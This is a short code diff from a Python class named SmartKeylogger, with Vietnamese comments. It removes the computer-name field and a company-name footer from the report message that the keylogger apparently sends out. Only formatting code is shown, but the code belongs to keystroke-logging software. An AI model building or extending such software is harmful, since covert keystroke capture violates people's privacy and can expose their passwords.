@@ -297,11 +297,6 @@ class SmartKeylogger:
             "color": 3447003,  # Màu xanh dương
             "fields": [
                 {
-                    "name": "💻 Máy Tính",
-                    "value": COMPUTER_NAME,
-                    "inline": True
-                },
-                {
                     "name": "🕐 Thời Gian",
                     "value": timestamp,
                     "inline": True
@@ -327,9 +322,6 @@ class SmartKeylogger:
                     "inline": True
                 }
             ],
-            "footer": {
-                "text": f"Công ty: {CONFIG['company_name']}"
-            }
         }
         
         data = {
